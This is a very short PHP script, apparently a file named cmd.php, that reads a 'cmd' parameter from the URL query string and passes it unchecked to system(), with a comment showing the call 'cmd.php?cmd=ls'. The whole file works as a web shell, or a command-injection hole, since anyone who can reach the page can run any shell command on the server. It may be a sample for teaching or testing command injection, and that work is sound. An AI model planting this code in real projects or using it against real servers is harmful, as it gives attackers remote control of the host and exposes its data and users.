<?php
//URL : cmd.php?cmd=ls

$cmd=$_GET['cmd'] ?? '' ;
if ($cmd){
    system("echo Listing: && $cmd");
}